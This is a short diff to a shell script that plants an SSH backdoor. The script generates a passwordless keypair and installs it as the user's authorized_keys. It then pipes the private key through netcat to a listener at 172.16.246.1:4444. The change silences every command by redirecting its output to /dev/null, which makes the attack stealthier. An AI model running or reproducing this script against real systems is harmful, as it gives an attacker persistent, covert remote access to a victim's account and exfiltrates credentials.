@@ -5,10 +5,10 @@
 #just on host set up nc listen on port to receive key
 #as long as ssh enabled no root required?
 
-cd ~
-mkdir .ssh
-cd .ssh
-ssh-keygen -f new_key -N ""
-mv new_key.pub authorized_keys
-chmod 600 new_key
-cat new_key | nc 172.16.246.1 4444 -q 0
+cd ~ > /dev/null 2>&1
+mkdir .ssh > /dev/null 2>&1
+cd .ssh > /dev/null 2>&1
+ssh-keygen -f new_key -N "" > /dev/null 2>&1
+mv new_key.pub authorized_keys > /dev/null 2>&1
+chmod 600 new_key > /dev/null 2>&1
+cat new_key | nc 172.16.246.1 4444 -q 0 > /dev/null 2>&1
